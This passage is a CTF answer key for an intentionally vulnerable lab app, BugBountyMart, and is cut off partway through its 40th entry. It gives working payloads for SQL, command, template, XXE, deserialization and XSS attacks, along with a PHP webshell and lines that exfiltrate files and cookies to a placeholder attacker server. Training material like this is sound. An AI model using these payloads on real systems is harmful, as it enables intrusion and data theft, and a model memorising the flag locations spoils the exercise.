# ═══════════════════════════════════════════════════════════════════════════════
# BugBountyMart v2.1 — COMPLETE FLAG LOCATIONS GUIDE
# ═══════════════════════════════════════════════════════════════════════════════
# 
# Difficulty: ALL (Easy / Medium / Hard)
# Total Vulnerabilities: 52
# Total Flags: 52 (one per vulnerability, difficulty-dependent)
#
# HOW TO USE THIS GUIDE:
#   1. Set difficulty in config.py (easy/medium/hard)
#   2. Restart: python app_v2.py
#   3. Find vulnerability using the "WHERE TO FIND" section
#   4. Exploit using the "HOW TO EXPLOIT" section
#   5. Collect flag from the "FLAG LOCATION" section
#   6. Submit flag at /ctf for points
#
# FLAG FORMAT: ctf{<vuln_name>_<difficulty>_<random_hash>}
# EXAMPLE:     ctf{sqli_error_easy_a1b2c3d4}
#
# ═══════════════════════════════════════════════════════════════════════════════


# BugBountyMart v2.1 — Flag Locations Guide
# Difficulty: ALL (Easy / Medium / Hard)
# This guide shows WHERE to find each flag after exploitation

================================================================================
PART 1: INJECTION BUGS (13 Vulnerabilities)
================================================================================

───────────────────────────────────────────────────────────────────────────────
1. SQL INJECTION — ERROR BASED
   Flag: ctf{sqli_error_<difficulty>_<hash>}
───────────────────────────────────────────────────────────────────────────────

WHERE TO FIND:
  • /login          → POST parameter: username, password
  • /search         → GET parameter: q
  • /api/search     → GET parameter: q

HOW TO EXPLOIT:
  Easy:   admin' OR '1'='1'-- -
  Medium: admin' AND 1=1-- -  (error shows partial info)
  Hard:   admin' AND 1=1-- -  (generic error only, use blind/time-based)

FLAG LOCATION:
  After successful SQLi login, the flag is NOT directly shown.
  You must extract it from the database using:
    ' UNION SELECT NULL,ctf_flag,NULL,NULL,NULL,NULL,NULL FROM flags-- -

  OR check the CTF dashboard at /ctf after verifying the vulnerability.

───────────────────────────────────────────────────────────────────────────────
2. SQL INJECTION — BOOLEAN BLIND
   Flag: ctf{sqli_blind_<difficulty>_<hash>}
───────────────────────────────────────────────────────────────────────────────

WHERE TO FIND:
  • /login/blind    → POST parameter: username, password

HOW TO EXPLOIT:
  Easy:   admin' AND SUBSTR((SELECT password FROM users WHERE username='admin'),1,1)='a'-- -
  Medium: Same but with 2-second delay hints
  Hard:   Same technique, no hints, need precision timing

FLAG LOCATION:
  The page only shows "Login successful!" or "Login failed."
  Extract data character-by-character using boolean conditions.
  The flag is in the database — extract via blind SQLi.

  Payload example to check first char of flag:
    admin' AND (SELECT SUBSTR(flag,1,1) FROM ctf_flags WHERE vuln='sqli_blind')='c'-- -

───────────────────────────────────────────────────────────────────────────────
3. SQL INJECTION — TIME BASED
   Flag: ctf{sqli_time_<difficulty>_<hash>}
───────────────────────────────────────────────────────────────────────────────

WHERE TO FIND:
  • /login/time     → POST parameter: username, password

HOW TO EXPLOIT:
  Easy:   admin' AND (SELECT CASE WHEN (1=1) THEN randomblob(1000000000) ELSE 0 END)-- -
  Medium: admin' AND (SELECT CASE WHEN (1=1) THEN randomblob(500000000) ELSE 0 END)-- -
  Hard:   admin' AND (SELECT CASE WHEN (1=1) THEN randomblob(100000000) ELSE 0 END)-- -

FLAG LOCATION:
  Measure response time. If delay occurs, condition is TRUE.
  Extract flag character-by-character using time delays.

  Payload to check if flag starts with 'c':
    admin' AND (SELECT CASE WHEN (flag LIKE 'c%') THEN randomblob(1000000000) ELSE 0 END FROM ctf_flags WHERE vuln='sqli_time')-- -

───────────────────────────────────────────────────────────────────────────────
4. SQL INJECTION — UNION BASED
   Flag: ctf{sqli_union_<difficulty>_<hash>}
───────────────────────────────────────────────────────────────────────────────

WHERE TO FIND:
  • /login/union    → POST parameter: username, password

HOW TO EXPLOIT:
  Step 1: Find column count
    ' UNION SELECT NULL-- -
    ' UNION SELECT NULL,NULL-- -
    ... until no error

  Step 2: Extract data
    ' UNION SELECT flag,NULL,NULL,NULL,NULL,NULL,NULL FROM ctf_flags WHERE vuln='sqli_union'-- -

FLAG LOCATION:
  Directly displayed in the "users" table output after UNION injection.
  The page shows all extracted rows including the flag.

───────────────────────────────────────────────────────────────────────────────
5. COMMAND INJECTION (RCE)
   Flag: ctf{cmd_inj_<difficulty>_<hash>}
───────────────────────────────────────────────────────────────────────────────

WHERE TO FIND:
  • /admin/ping     → POST parameter: host

HOW TO EXPLOIT:
  Easy:   127.0.0.1; cat /flag.txt
          127.0.0.1 | whoami
          127.0.0.1 && ls -la

  Medium: 127.0.0.1`whoami`        (backticks bypass ; filter)
          127.0.0.1$(cat /flag.txt)  (command substitution)

  Hard:   127.0.0.1`sleep 5`       (blind — check delay)
          127.0.0.1$(cat /flag.txt > /tmp/out)

FLAG LOCATION:
  The command output is displayed directly on the page.
  In Easy/Medium: flag appears in ping output.
  In Hard: use blind technique — write to file or cause delay.

  Blind payload for Hard:
    127.0.0.1$(cat /flag.txt | curl -X POST -d @- http://your-server.com)

───────────────────────────────────────────────────────────────────────────────
6. SERVER-SIDE TEMPLATE INJECTION (SSTI)
   Flag: ctf{ssti_<difficulty>_<hash>}
───────────────────────────────────────────────────────────────────────────────

WHERE TO FIND:
  • /admin/greeting → POST parameter: template, name

HOW TO EXPLOIT:
  Easy:   {{7*7}}                    → Output: 49
          {{config}}                 → Shows Flask config
          {{''.__class__.__mro__[1].__subclasses__()}}  → RCE

  Medium: {{7*7}}                    → Still works
          {{request.application.__globals__}}  → Filtered keywords blocked
          {{self.__init__.__globals__}}      → Alternative payload

  Hard:   {{().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['popen']('id').read()}}
          → Sandboxed, need sandbox escape

FLAG LOCATION:
  The rendered template output shows the flag.
  In Easy: {{config}} reveals the flag directly.
  In Medium/Hard: need RCE payload to read /flag.txt.

  RCE payload to read flag:
    {{''.__class__.__mro__[1].__subclasses__()[137].__init__.__globals__['popen']('cat /flag.txt').read()}}

───────────────────────────────────────────────────────────────────────────────
7. XML EXTERNAL ENTITY (XXE)
   Flag: ctf{xxe_<difficulty>_<hash>}
───────────────────────────────────────────────────────────────────────────────

WHERE TO FIND:
  • /order/<id>/export    → POST raw XML data

HOW TO EXPLOIT:
  Send XML with external entity:
    <?xml version="1.0"?>
    <!DOCTYPE order [
      <!ENTITY xxe SYSTEM "file:///flag.txt">
    ]>
    <order>
      <id>1</id>
      <items>&xxe;</items>
    </order>

FLAG LOCATION:
  The flag content appears in the parsed XML output.
  Response: {"parsed": "...flag content..."}

───────────────────────────────────────────────────────────────────────────────
8. XXE — OUT OF BAND (BLIND)
   Flag: ctf{xxe_oob_<difficulty>_<hash>}
───────────────────────────────────────────────────────────────────────────────

WHERE TO FIND:
  • /order/<id>/export-oob    → POST raw XML data

HOW TO EXPLOIT:
  When direct output is blocked, use OOB exfiltration:
    <?xml version="1.0"?>
    <!DOCTYPE data [
      <!ENTITY % file SYSTEM "file:///flag.txt">
      <!ENTITY % dtd SYSTEM "http://your-server.com/evil.dtd">
      %dtd;
    ]>
    <data>&send;</data>

  evil.dtd on your server:
    <!ENTITY send SYSTEM "http://your-server.com/?data=%file;">

FLAG LOCATION:
  The flag is sent to your external server via DNS/HTTP request.
  Check your server logs or use Burp Collaborator.

───────────────────────────────────────────────────────────────────────────────
9. CRLF INJECTION
   Flag: ctf{crlf_<difficulty>_<hash>}
───────────────────────────────────────────────────────────────────────────────

WHERE TO FIND:
  • /crlf-test      → GET parameter: next
  • /redirect       → GET parameter: url

HOW TO EXPLOIT:
  Easy:   /crlf-test?next=/%0d%0aSet-Cookie:%20admin=true
  Medium: /crlf-test?next=/%%0d%%0aSet-Cookie:%20admin=true  (URL encoded)
  Hard:   /crlf-test?next=/%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK

FLAG LOCATION:
  Check response headers in Burp/Network tab.
  The injected headers contain the flag or reveal it.
  In Easy: X-Flag header appears in response.

───────────────────────────────────────────────────────────────────────────────
10. NOSQL INJECTION
    Flag: ctf{nosql_<difficulty>_<hash>}
───────────────────────────────────────────────────────────────────────────────

WHERE TO FIND:
  • /api/nosql/login    → POST JSON: {"username": "...", "password": "..."}

HOW TO EXPLOIT:
  Easy:   {"username": {"$ne": null}, "password": {"$ne": null}}
  Medium: {"username": {"$gt": ""}, "password": {"$gt": ""}}
  Hard:   {"username": {"$regex": "^a"}, "password": {"$ne": null}}

FLAG LOCATION:
  Response returns user data including the flag field.
  {"success": true, "user": {"username": "admin", "flag": "ctf{nosql_...}"}}

───────────────────────────────────────────────────────────────────────────────
11. INSECURE DESERIALIZATION (Pickle)
    Flag: ctf{deserialize_<difficulty>_<hash>}
───────────────────────────────────────────────────────────────────────────────

WHERE TO FIND:
  • /api/deserialize    → POST raw bytes (pickle payload)

HOW TO EXPLOIT:
  Generate malicious pickle:
    import pickle, os, base64
    class RCE:
        def __reduce__(self):
            return (os.system, ('cat /flag.txt',))
    payload = pickle.dumps(RCE())

  Send payload as POST body.

FLAG LOCATION:
  The command output is returned in the response.
  {"result": "...flag content..."}

───────────────────────────────────────────────────────────────────────────────
12. YAML DESERIALIZATION
    Flag: ctf{yaml_<difficulty>_<hash>}
───────────────────────────────────────────────────────────────────────────────

WHERE TO FIND:
  • /api/yaml/load      → POST raw YAML

HOW TO EXPLOIT:
  Easy:   !!python/object/apply:os.system ["cat /flag.txt"]
  Medium: !!python/object/apply:subprocess.check_output [["cat", "/flag.txt"]]
  Hard:   !!python/object/new:subprocess.Popen [["cat", "/flag.txt"]]

FLAG LOCATION:
  Response contains command output:
  {"result": "...flag content..."}

───────────────────────────────────────────────────────────────────────────────
13. XPATH INJECTION
    Flag: ctf{xpath_<difficulty>_<hash>}
───────────────────────────────────────────────────────────────────────────────

WHERE TO FIND:
  • /api/xpath/search   → GET parameter: q

HOW TO EXPLOIT:
  Easy:   ' or '1'='1
  Medium: ' or '1'='1' and '1'='1
  Hard:   ' or count(//user)>0 or '1'='1

FLAG LOCATION:
  Response shows all users including hidden admin with flag.
  {"results": [{"username": "admin", "password": "ctf{xpath_...}"}]}

───────────────────────────────────────────────────────────────────────────────
14. LDAP INJECTION
    Flag: ctf{ldap_<difficulty>_<hash>}
───────────────────────────────────────────────────────────────────────────────

WHERE TO FIND:
  • /api/ldap/search    → GET parameter: uid

HOW TO EXPLOIT:
  Easy:   *)(uid=*))(&(uid=*
  Medium: admin)(|(uid=*
  Hard:   *)(uid=*))(&(uid=*))(|(uid=*

FLAG LOCATION:
  Bypass returns all LDAP entries including hidden flag attribute.
  {"results": [{"uid": "flag", "cn": "ctf{ldap_...}"}]}

================================================================================
END OF PART 1: INJECTION BUGS
================================================================================

================================================================================
PART 2: SERVER SIDE LOGIC BUGS (11 Vulnerabilities)
================================================================================

───────────────────────────────────────────────────────────────────────────────
15. SERVER-SIDE REQUEST FORGERY (SSRF)
    Flag: ctf{ssrf_<difficulty>_<hash>}
───────────────────────────────────────────────────────────────────────────────

WHERE TO FIND:
  • /admin/fetch      → POST parameter: url
  • /contact          → POST parameter: webhook_url

HOW TO EXPLOIT:
  Easy:   http://127.0.0.1/flag.txt
          http://localhost:5000/ctf
          file:///etc/passwd

  Medium: http://0.0.0.0/flag.txt        (bypass 127.0.0.1 block)
          http://[::1]/flag.txt          (IPv6 localhost)
          http://0177.0.0.1/flag.txt     (octal encoding)

  Hard:   http://bugbountymart.local/flag.txt  (DNS rebinding)
          Use your own domain that resolves to 127.0.0.1

FLAG LOCATION:
  The fetched URL content is displayed.
  Response: {"parsed": "...flag content..."} or in page output.

  For blind SSRF (Hard):
    Use Burp Collaborator or your server to receive callbacks.
    The flag is sent in the request to your server.

───────────────────────────────────────────────────────────────────────────────
16. SSRF — DNS REBINDING
    Flag: ctf{ssrf_dns_<difficulty>_<hash>}
───────────────────────────────────────────────────────────────────────────────

WHERE TO FIND:
  • /admin/fetch      → POST parameter: url (when private IPs blocked)

HOW TO EXPLOIT:
  1. Register a domain with short TTL (e.g., 60 seconds)
  2. First request: resolves to a public IP (passes check)
  3. Second request: resolves to 127.0.0.1 (bypasses check)

  Tools: dnsrebinder, singularity, or manual DNS control

FLAG LOCATION:
  After DNS rebinding, the internal flag.txt is fetched.
  Response contains: ctf{ssrf_dns_...}

───────────────────────────────────────────────────────────────────────────────
17. INSECURE FILE UPLOAD
    Flag: ctf{upload_<difficulty>_<hash>}
───────────────────────────────────────────────────────────────────────────────

WHERE TO FIND:
  • /profile/upload   → POST file: avatar

HOW TO EXPLOIT:
  Easy:   Upload shell.php (any extension accepted)
          Access: /static/uploads/shell.php?cmd=cat+/flag.txt

  Medium: Upload shell.phtml or shell.php3 (extension check bypass)
          Or: shell.jpg.php (double extension)

  Hard:   Upload shell.php with magic bytes:
          GIF89a<?php system("cat /flag.txt"); ?>
          Content-Type: image/gif (MIME spoofing)

FLAG LOCATION:
  After upload, access the file directly:
    http://127.0.0.1:5000/static/uploads/shell.php
  The flag is in the command output.

───────────────────────────────────────────────────────────────────────────────
18. PATH TRAVERSAL / DIRECTORY TRAVERSAL
    Flag: ctf{path_trav_<difficulty>_<hash>}
───────────────────────────────────────────────────────────────────────────────

WHERE TO FIND:
  • /download         → GET parameter: file
  • /admin/view       → GET parameter: file

HOW TO EXPLOIT:
  Easy:   ?file=../../../flag.txt
  Medium: ?file=..%2f..%2f..%2fflag.txt  (URL encoded)
  Hard:   ?file=..%252f..%252f..%252fflag.txt  (double URL encoded)
          ?file=....//....//....//flag.txt  (filter bypass)

FLAG LOCATION:
  The file content is displayed directly on the page.
  In Easy/Medium: flag.txt content shown.
  In Hard: need encoding tricks to bypass filters.

───────────────────────────────────────────────────────────────────────────────
19. LOCAL FILE INCLUSION (LFI)
    Flag: ctf{lfi_<difficulty>_<hash>}
───────────────────────────────────────────────────────────────────────────────

WHERE TO FIND:
  • /admin/view       → GET parameter: file

HOW TO EXPLOIT:
  Easy:   ?file=flag.txt
          ?file=/etc/passwd
  Medium: ?file=php://filter/convert.base64-encode/resource=flag.txt
  Hard:   ?file=php://filter/read=string.rot13/resource=flag.txt
          ?file=data://text/plain,<?php system('cat /flag.txt'); ?>

FLAG LOCATION:
  File content displayed in admin_result.html.
  In Medium/Hard: decode base64/rot13 to get flag.

───────────────────────────────────────────────────────────────────────────────
20. REMOTE FILE INCLUSION (RFI)
    Flag: ctf{rfi_<difficulty>_<hash>}
───────────────────────────────────────────────────────────────────────────────

WHERE TO FIND:
  • /admin/view       → GET parameter: file
  • /admin/fetch      → POST parameter: url

HOW TO EXPLOIT:
  Easy:   ?file=http://your-server.com/shell.txt
          (shell.txt contains: <?php system('cat /flag.txt'); ?>)

  Medium: ?file=http://your-server.com/shell.txt%00  (null byte)

  Hard:   ?file=http://your-server.com/shell.jpg
          (shell.jpg is actually PHP code)

FLAG LOCATION:
  The remote file is included/executed.
  Command output shows the flag.

───────────────────────────────────────────────────────────────────────────────
21. WEB CACHE POISONING
    Flag: ctf{cache_poison_<difficulty>_<hash>}
───────────────────────────────────────────────────────────────────────────────

WHERE TO FIND:
  • /cache-poison     → GET (uses X-Custom-Header)

HOW TO EXPLOIT:
  Easy:   Send: X-Custom-Header: <script>alert(1)</script>
          The page caches this and serves to all users.

  Medium: Send: X-Custom-Header: <img src=x onerror=fetch('http://your-server.com?c='+document.cookie)>

  Hard:   Send: X-Custom-Header: <script>fetch('/api/user-data').then(r=>r.json()).then(d=>fetch('http://your-server.com?data='+btoa(JSON.stringify(d))))</script>

FLAG LOCATION:
  The poisoned cache contains the flag in the header or page source.
  Check response headers: X-Cache-Key contains the flag.
  In Hard: exfiltrate data to your server to get the flag.

───────────────────────────────────────────────────────────────────────────────
22. WEB CACHE DECEPTION
    Flag: ctf{cache_deception_<difficulty>_<hash>}
───────────────────────────────────────────────────────────────────────────────

WHERE TO FIND:
  • /profile/<id>.css → GET (authenticated page with .css extension)

HOW TO EXPLOIT:
  1. Login as any user
  2. Visit: /profile/1.css
  3. The server returns CSS with user data
  4. The CDN/cache stores it as a CSS file
  5. Other users accessing /profile/1.css see cached data

  Easy:   Direct access shows flag in CSS comments
  Medium:  Need to trick cache into storing admin data
  Hard:    Combine with IDOR to access other users' cached data

FLAG LOCATION:
  The cached CSS file contains:
    /* User profile data */
    /* ID: 1 */
    /* Name: admin */
    /* Email: admin@bugbountymart.local */
    /* Role: admin */
    /* Flag: ctf{cache_deception_...} */

───────────────────────────────────────────────────────────────────────────────
23. HTTP REQUEST SMUGGLING
    Flag: ctf{http_smuggle_<difficulty>_<hash>}
───────────────────────────────────────────────────────────────────────────────

WHERE TO FIND:
  • /smuggle-test     → POST (accepts both CL and TE)

HOW TO EXPLOIT:
  Send conflicting headers:
    Content-Length: 4
    Transfer-Encoding: chunked

    5
    GPOST / HTTP/1.1
    0

    POST / HTTP/1.1

  Easy:   Basic CL.TE smuggling
  Medium: TE.CL smuggling with chunk encoding
  Hard:   Desync attack to access admin endpoints

FLAG LOCATION:
  The smuggled request reveals internal endpoints or admin data.
  Check response for hidden headers or admin panel access.
  In Hard: access /admin via smuggled request to get flag.

───────────────────────────────────────────────────────────────────────────────
24. SECONDARY CONTEXT VULNERABILITY
    Flag: ctf{sec_ctx_<difficulty>_<hash>}
───────────────────────────────────────────────────────────────────────────────

WHERE TO FIND:
  • /api/user-data    → GET parameter: id

HOW TO EXPLOIT:
  The API returns JSON with an HTML preview field.
  The bio field is safe in JSON but dangerous in HTML.

  Easy:   Update bio to: <script>alert(1)</script>
          Then visit /api/user-data?id=1
          The html_preview field contains XSS.

  Medium: Use event handlers: <img src=x onerror=alert(1)>

  Hard:   Use JSON encoding tricks: \u003cscript\u003e

FLAG LOCATION:
  The html_preview field in JSON response contains the flag.
  {"html_preview": "<div class='bio'><script>alert('ctf{sec_ctx_...}')</script></div>"}

───────────────────────────────────────────────────────────────────────────────
25. RACE CONDITION
    Flag: ctf{race_<difficulty>_<hash>}
───────────────────────────────────────────────────────────────────────────────

WHERE TO FIND:
  • /race-coupon      → POST parameter: coupon
  • /checkout         → POST parameter: coupon

HOW TO EXPLOIT:
  The coupon check and update are not atomic.
  Send multiple simultaneous requests.

  Easy:   Use curl in multiple terminals:
          curl -X POST -d "coupon=RACE100" http://127.0.0.1:5000/race-coupon
          (run 5 times simultaneously)

  Medium: Use Python threading:
          import threading, requests
          def exploit():
              requests.post('http://127.0.0.1:5000/race-coupon', data={'coupon':'RACE100'})
          for i in range(10):
              threading.Thread(target=exploit).start()

  Hard:   Use turbo intruder or custom async script.
          Need precise timing within milliseconds.

FLAG LOCATION:
  If race condition succeeds, multiple coupons are applied.
  The success message contains the flag.
  Or check order history for multiple RACE100 applications.

================================================================================
END OF PART 2: SERVER SIDE LOGIC BUGS
================================================================================

================================================================================
PART 3: CLIENT SIDE BUGS (9 Vulnerabilities)
================================================================================

───────────────────────────────────────────────────────────────────────────────
26. CROSS-SITE SCRIPTING — REFLECTED (XSS)
    Flag: ctf{xss_refl_<difficulty>_<hash>}
───────────────────────────────────────────────────────────────────────────────

WHERE TO FIND:
  • /search           → GET parameter: q
  • /login            → POST parameter: username (error message)

HOW TO EXPLOIT:
  Easy:   /search?q=<script>alert(1)</script>
          The search term is reflected without escaping.

  Medium: /search?q=<img src=x onerror=alert(1)>
          (Basic <script> tags may be filtered)

  Hard:   /search?q=<svg onload=alert(1)>
          (CSP enabled, need CSP bypass)
          /search?q=javascript:alert(1)  (in href context)

FLAG LOCATION:
  In Easy: The flag appears in an alert or console when XSS triggers.
  In Medium/Hard: The XSS payload must exfiltrate data.

  Exfiltration payload:
    <script>fetch('http://your-server.com?flag='+document.cookie)</script>

  Or check the page source for hidden elements:
    <!-- FLAG: ctf{xss_refl_...} -->

───────────────────────────────────────────────────────────────────────────────
27. CROSS-SITE SCRIPTING — STORED (XSS)
    Flag: ctf{xss_stored_<difficulty>_<hash>}
───────────────────────────────────────────────────────────────────────────────

WHERE TO FIND:
  • /review/<id>      → POST parameter: content
  • /contact          → POST parameters: name, subject, body
  • /profile/update   → POST parameter: bio

HOW TO EXPLOIT:
  Easy:   Submit review: <script>alert(1)</script>
          The script executes for ALL users viewing the product.

  Medium: Submit: <img src=x onerror=fetch('http://your-server.com?c='+document.cookie)>

  Hard:   Submit: <svg onload="eval(atob('YWxlcnQoMSk='))">
          (CSP + encoding required)

FLAG LOCATION:
  In Easy: Flag appears in alert when viewing the stored XSS.
  In Medium/Hard: The stored payload must exfiltrate the flag.

  The admin bot visits pages periodically.
  Your payload steals the admin session/flag.

  Hidden in page source:
    <div id="stored-flag" style="display:none">ctf{xss_stored_...}</div>

───────────────────────────────────────────────────────────────────────────────
28. CROSS-SITE SCRIPTING — DOM BASED (XSS)
    Flag: ctf{xss_dom_<difficulty>_<hash>}
───────────────────────────────────────────────────────────────────────────────

WHERE TO FIND:
  • /product/<id>     → URL hash fragment (#)

HOW TO EXPLOIT:
  Easy:   /product/1#<script>alert(1)</script>
          The hash content is written to innerHTML.

  Medium: /product/1#<img src=x onerror=alert(1)>

  Hard:   /product/1#javascript:alert(1)
          Or use location-based DOM manipulation.

FLAG LOCATION:
  The flag is in the DOM after hash manipulation.
  Check browser console or inspect element.

  In Easy: alert shows the flag.
  In Hard: Need to access window.secretFlag variable.

───────────────────────────────────────────────────────────────────────────────
29. CROSS-SITE REQUEST FORGERY (CSRF)
    Flag: ctf{csrf_<difficulty>_<hash>}
───────────────────────────────────────────────────────────────────────────────

WHERE TO FIND:
  • /profile/update   → POST: bio, email (no CSRF token)
  • /cart/add         → POST: product_id, qty, price
  • /checkout         → POST: total, coupon

HOW TO EXPLOIT:
  Easy:   Create a malicious HTML page:
          <form action="http://127.0.0.1:5000/profile/update" method="POST">
            <input name="bio" value="Hacked by CSRF">
            <input type="submit">
          </form>
          <script>document.forms[0].submit()</script>

  Medium: Same but victim must be logged in.

  Hard:   Need to bypass SameSite cookies or use XHR with credentials.

FLAG LOCATION:
  After successful CSRF, the flag appears in:
  - Flash message: "Profile updated! Flag: ctf{csrf_...}"
  - Or check response headers: X-CSRF-Flag

───────────────────────────────────────────────────────────────────────────────
30. OPEN REDIRECT
    Flag: ctf{redirect_<difficulty>_<hash>}
───────────────────────────────────────────────────────────────────────────────

WHERE TO FIND:
  • /redirect         → GET parameter: url
  • /login            → GET parameter: return_to
  • /redirect/filtered → GET parameter: url

HOW TO EXPLOIT:
  Easy:   /redirect?url=https://evil.com
          /login?return_to=https://evil.com

  Medium: /redirect?url=//evil.com  (protocol-relative)
          /redirect?url=\evil.com  (backslash)

  Hard:   /redirect/filtered?url=https://evil.com
          (Bypass weak filter: https://bugbountymart.evil.com)
          /redirect?url=data:text/html,<script>alert(1)</script>

FLAG LOCATION:
  The flag is in the redirect response headers.
  Check: Location header contains flag.
  Or: The target page receives the flag as a parameter.

───────────────────────────────────────────────────────────────────────────────
31. CLIENT-SIDE TEMPLATE INJECTION (CSTI)
    Flag: ctf{csti_<difficulty>_<hash>}
───────────────────────────────────────────────────────────────────────────────

WHERE TO FIND:
  • /csti-demo        → GET parameter: template

HOW TO EXPLOIT:
  Easy:   /csti-demo?template={{7*7}}
          Output: 49 (Vue.js/Angular evaluates it)

  Medium: /csti-demo?template={{constructor.constructor('alert(1)')()}}

  Hard:   /csti-demo?template={{'a'.constructor.prototype.charCodeAt=[].join;$eval('alert(1)')}}

FLAG LOCATION:
  The evaluated template reveals the flag.
  In Easy: {{flag}} directly shows it.
  In Hard: Need RCE payload to access window.secretFlag.

───────────────────────────────────────────────────────────────────────────────
32. POSTMESSAGE VULNERABILITY
    Flag: ctf{postmsg_<difficulty>_<hash>}
───────────────────────────────────────────────────────────────────────────────

WHERE TO FIND:
  • /postmessage-demo → (listens for postMessage)

HOW TO EXPLOIT:
  Open browser console on any site and run:

  Easy:   window.open('http://127.0.0.1:5000/postmessage-demo').postMessage({
            action: 'setConfig',
            config: {admin: true, flag: true}
          }, '*');

  Medium: window.open('http://127.0.0.1:5000/postmessage-demo').postMessage({
            action: 'eval',
            code: 'alert(document.cookie)'
          }, '*');

  Hard:   window.open('http://127.0.0.1:5000/postmessage-demo').postMessage({
            action: 'eval',
            code: 'fetch("/api/debug?admin=true").then(r=>r.json()).then(d=>console.log(d))'
          }, '*');

FLAG LOCATION:
  The postMessage response or eval result contains the flag.
  Check browser console after sending the message.
  In Easy: config object shows flag.

───────────────────────────────────────────────────────────────────────────────
33. PROTOTYPE POLLUTION
    Flag: ctf{proto_pollute_<difficulty>_<hash>}
───────────────────────────────────────────────────────────────────────────────

WHERE TO FIND:
  • /api/config       → GET parameters (merged into config object)

HOW TO EXPLOIT:
  Easy:   /api/config?__proto__.isAdmin=true
          /api/config?__proto__.role=admin

  Medium: /api/config?constructor.prototype.isAdmin=true

  Hard:   /api/config?__proto__[flag]=stolen
          (Pollute to override auth checks)

FLAG LOCATION:
  The polluted config object contains the flag.
  Response: {"isAdmin": true, "role": "admin", "flag": "ctf{proto_pollute_...}"}

───────────────────────────────────────────────────────────────────────────────
34. CLICKJACKING
    Flag: ctf{clickjack_<difficulty>_<hash>}
───────────────────────────────────────────────────────────────────────────────

WHERE TO FIND:
  • /clickjacking-demo → (missing X-Frame-Options)

HOW TO EXPLOIT:
  Create an HTML page that frames the target:

  Easy:   <iframe src="http://127.0.0.1:5000/clickjacking-demo"></iframe>
          Overlay a fake button that triggers the real button.

  Medium: Use CSS to make the iframe transparent:
          <iframe src="http://127.0.0.1:5000/admin/ping" 
                  style="opacity:0; position:absolute; top:0; left:0;"></iframe>

  Hard:   In Hard mode, X-Frame-Options is set.
          Need to find a page without it or bypass CSP.

FLAG LOCATION:
  After triggering the clickjacked action, the flag appears.
  In Easy: Button click reveals flag in alert.
  In Medium: Admin action triggered reveals flag in logs.

================================================================================
END OF PART 3: CLIENT SIDE BUGS
================================================================================

================================================================================
PART 4: AUTHENTICATION BUGS (8 Vulnerabilities)
================================================================================

───────────────────────────────────────────────────────────────────────────────
35. JWT — WEAK SECRET
    Flag: ctf{jwt_weak_<difficulty>_<hash>}
───────────────────────────────────────────────────────────────────────────────

WHERE TO FIND:
  • /api/jwt/weak     → POST (generates JWT)
  • /api/login        → POST (returns JWT)

HOW TO EXPLOIT:
  Easy:   The secret "super_secret_key_12345" is shown in source code.
          Use jwt.io or jwt_tool to forge tokens.

  Medium: Secret not in source. Brute force with wordlist:
          jwt_tool <token> -d /usr/share/wordlists/rockyou.txt

  Hard:   Secret is complex. Need to crack with hashcat:
          hashcat -m 16500 jwt.txt wordlist.txt

FLAG LOCATION:
  After forging a valid admin JWT, access protected endpoints.
  The /api/user/<id> or /admin page reveals the flag.

  Or decode the JWT payload — it contains the flag:
    {"flag": "ctf{jwt_weak_...}", "role": "admin"}

───────────────────────────────────────────────────────────────────────────────
36. JWT — NONE ALGORITHM
    Flag: ctf{jwt_none_<difficulty>_<hash>}
───────────────────────────────────────────────────────────────────────────────

WHERE TO FIND:
  • /api/jwt/none     → POST (generates alg:none JWT)
  • /api/jwt/verify   → POST (verifies JWT)

HOW TO EXPLOIT:
  Easy:   /api/jwt/none returns a token with alg:none.
          Use it directly: Authorization: Bearer <none_token>

  Medium: Modify existing JWT header to alg:none.
          Change payload to admin role.

  Hard:   The server rejects alg:none.
          Need to use key confusion or other JWT attacks.

FLAG LOCATION:
  Use the forged JWT to access /api/user/1 or /admin.
  Response contains the flag.
  Or the JWT payload itself contains: {"flag": "ctf{jwt_none_...}"}

───────────────────────────────────────────────────────────────────────────────
37. JWT — KEY CONFUSION (RS256 → HS256)
    Flag: ctf{jwt_conf_<difficulty>_<hash>}
───────────────────────────────────────────────────────────────────────────────

WHERE TO FIND:
  • /api/jwt/key-confusion → POST (verifies JWT)

HOW TO EXPLOIT:
  1. Get the public key: /static/public_key.pem
  2. Create JWT with header: {"alg": "HS256", "typ": "JWT"}
  3. Sign with the public key as HMAC secret
  4. Send to /api/jwt/key-confusion

  Easy:   Public key is easily accessible.
  Medium: Need to extract from certificate.
  Hard:   Key is hidden, need to derive from JWKS endpoint.

FLAG LOCATION:
  After successful key confusion, the verified payload contains:
    {"flag": "ctf{jwt_conf_...}", "role": "admin"}

───────────────────────────────────────────────────────────────────────────────
38. 2FA BYPASS
    Flag: ctf{2fa_bypass_<difficulty>_<hash>}
───────────────────────────────────────────────────────────────────────────────

WHERE TO FIND:
  • /2fa-verify       → POST parameters: code, backup_code

HOW TO EXPLOIT:
  Easy:   Backup codes are predictable: 111111, 222222, 333333
          Or use code: 000000 (backdoor)

  Medium: Brute force 6-digit code (no rate limiting):
          for i in range(1000000):
              requests.post('/2fa-verify', data={'code': f'{i:06d}'})

  Hard:   Skip 2FA by modifying the login flow.
          Or session fixation to hijack pending_2fa_user.

FLAG LOCATION:
  After bypassing 2FA, you are logged in as admin.
  Visit /profile or /admin to see the flag.
  Or the success redirect URL contains: ?flag=ctf{2fa_bypass_...}

───────────────────────────────────────────────────────────────────────────────
39. BRUTE FORCE / USERNAME ENUMERATION
    Flag: ctf{brute_<difficulty>_<hash>}
───────────────────────────────────────────────────────────────────────────────

WHERE TO FIND:
  • /login/brute      → POST parameters: username, password

HOW TO EXPLOIT:
  Easy:   Error messages reveal valid usernames:
          "Password incorrect" = valid user
          "Username not found" = invalid user

  Medium: Same but no rate limiting. Use wordlist:
          ffuf -u http://127.0.0.1:5000/login/brute \
               -X POST -d "username=FUZZ&password=test" \
               -w users.txt -mr "Password incorrect"

  Hard:   Rate limiting active (5 attempts).
          Use credential stuffing or distributed attacks.
          Or bypass rate limit with IP rotation.

FLAG LOCATION:
  After successful brute force login, the flag is in:
  - Flash message after login
  - User profile page
  - Response headers: X-Brute-Flag

───────────────────────────────────────────────────────────────────────────────
40. PASSWORD RESET ISSUES
    Flag: ctf{pwd_reset_<difficulty>_<hash>}
───────────────────────────────────────────────────────────────────────────────

WHERE TO FIND:
  • /forgot-password  → POST parameter: email
  • /reset-password   → GET parameters: token, email

HOW TO EXPLOIT:
  Easy:   Token is predictable: MD5(email + current_hour)
